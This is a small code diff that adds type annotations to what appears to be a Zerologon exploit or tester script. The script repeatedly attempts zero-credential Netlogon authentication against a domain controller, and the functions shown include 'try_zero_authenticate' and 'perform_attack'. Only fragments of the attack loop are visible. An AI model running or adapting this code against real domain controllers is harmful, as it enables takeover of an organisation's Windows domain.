@@ -21,13 +21,13 @@ from subprocess import check_call
 MAX_ATTEMPTS = 2000
 
 
-def fail(msg):
+def fail(msg) -> None:
     print(msg, file=sys.stderr)
     print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
     sys.exit(2)
 
 
-def try_zero_authenticate(dc_handle: str, dc_ip: str, target_computer: str) -> DCERPC_v5 | none:
+def try_zero_authenticate(dc_handle: str, dc_ip: str, target_computer: str) -> DCERPC_v5 | None:
     # Connect to the DC's Netlogon service.
     binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
     rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
@@ -79,7 +79,7 @@ def try_zero_authenticate(dc_handle: str, dc_ip: str, target_computer: str) -> D
         fail(f'Unexpected error: {ex}.')
 
 
-def perform_attack(dc_handle: str, dc_ip: str, target_computer: str):
+def perform_attack(dc_handle: str, dc_ip: str, target_computer: str) -> None:
     # Keep authenticating until successful. Expected average number of attempts needed: 256.
     print('Performing authentication attempts...')
     rpc_con = None
